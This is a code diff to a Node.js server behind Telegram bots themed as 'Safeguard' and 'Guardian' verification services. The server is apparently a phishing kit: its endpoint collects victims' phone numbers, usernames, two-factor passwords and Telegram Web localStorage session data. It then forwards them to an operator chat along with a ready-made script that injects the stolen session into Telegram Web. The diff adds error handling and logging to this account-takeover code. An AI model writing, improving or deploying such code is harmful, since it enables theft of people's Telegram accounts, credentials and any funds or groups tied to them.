@@ -43,15 +43,17 @@ let guardianUsername;
 safeguardBot.getMe().then(botInfo => {
   safeguardUsername = botInfo.username;
   console.log(`Safeguard Bot Username: ${safeguardUsername}`);
-});
+}).catch(err => console.error("Error getting Safeguard bot info:", err));
+
 delugeBot.getMe().then(botInfo => {
   delugeUsername = botInfo.username;
   console.log(`Deluge Bot Username: ${delugeUsername}`);
-});
+}).catch(err => console.error("Error getting Deluge bot info:", err));
+
 guardianBot.getMe().then(botInfo => {
   guardianUsername = botInfo.username;
   console.log(`Guardian Bot Username: ${guardianUsername}`);
-});
+}).catch(err => console.error("Error getting Guardian bot info:", err));
 
 const app = express();
 app.use(express.json());
@@ -72,21 +74,26 @@ app.get("/guardian/", (req, res) => {
 
 // Handle /a/ route for Telegram login
 app.get("/a/", (req, res) => {
-  res.redirect("https://web.telegram.org/a/");
+  // Redirect to Telegram login with a return URL
+  const returnUrl = req.query.returnUrl || '/safeguard/?type=safeguard';
+  console.log(`Redirecting to Telegram login with returnUrl: ${returnUrl}`);
+  res.redirect(`https://web.telegram.org/a/`);
+  // Note: Telegram doesn't support automatic redirect after login, so the user will need to manually return to the mini app
 });
 
 app.post("/api/users/telegram/info", async (req, res) => {
   try {
     const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
+    console.log(`Received user data for userId ${userId}, type: ${type}`);
     let pass = password || "No Two-factor authentication enabled.";
-    let usernameText = usernames ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "";
+    let usernameText = usernames && usernames.length > 0 ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "No usernames";
     const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
     const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
     const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
 
     await handleRequest(req, res, { password: pass, script: quickAuth, userId, name: firstName, number: formattedNumber, usernames: usernameText, premium: isPremium, type });
   } catch (error) {
-    console.error("500 server error", error);
+    console.error("500 server error in /api/users/telegram/info:", error);
     res.status(500).json({ error: "server error" });
   }
 });
@@ -94,11 +101,26 @@ app.post("/api/users/telegram/info", async (req, res) => {
 const handleRequest = async (req, res, data) => {  
   const botMap = { safeguard: safeguardBot, guardian: guardianBot, deluge: delugeBot };
   let bot = botMap[data.type] || null;
-  await bot.sendMessage(
-    process.env.LOGS_ID,
-    `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`,
-    { parse_mode: "HTML" }
-  );
+  if (!bot) {
+    console.error(`No bot found for type: ${data.type}`);
+    res.status(400).json({ error: "Invalid bot type" });
+    return;
+  }
+
+  // Send user data to LOGS_ID
+  try {
+    console.log(`Sending user data to LOGS_ID: ${process.env.LOGS_ID}`);
+    await bot.sendMessage(
+      process.env.LOGS_ID,
+      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`,
+      { parse_mode: "HTML" }
+    );
+    console.log(`Successfully sent user data to LOGS_ID for userId ${data.userId}`);
+  } catch (error) {
+    console.error(`Failed to send user data to LOGS_ID: ${error.message}`);
+  }
+
+  // Send temporary link to the user (for safeguard and guardian)
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image = type === "safeguard" ? safeguardSuccess : guardianSuccess;
@@ -110,8 +132,15 @@ const handleRequest = async (req, res, data) => {
       ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING", url: "https://t.me/SOLTRENDING" }]] } }
       : { reply_markup: { inline_keyboard: [[{ text: randomText, url: `https://t.me/+${generateRandomString(16)}` }]] } };
 
-    await bot.sendPhoto(data.userId, image, { caption, ...buttons, parse_mode: "HTML" });
+    try {
+      console.log(`Sending temporary link to userId ${data.userId}`);
+      await bot.sendPhoto(data.userId, image, { caption, ...buttons, parse_mode: "HTML" });
+      console.log(`Successfully sent temporary link to userId ${data.userId}`);
+    } catch (error) {
+      console.error(`Failed to send temporary link to userId ${data.userId}: ${error.message}`);
+    }
   }
+
   res.json({});
 };
 
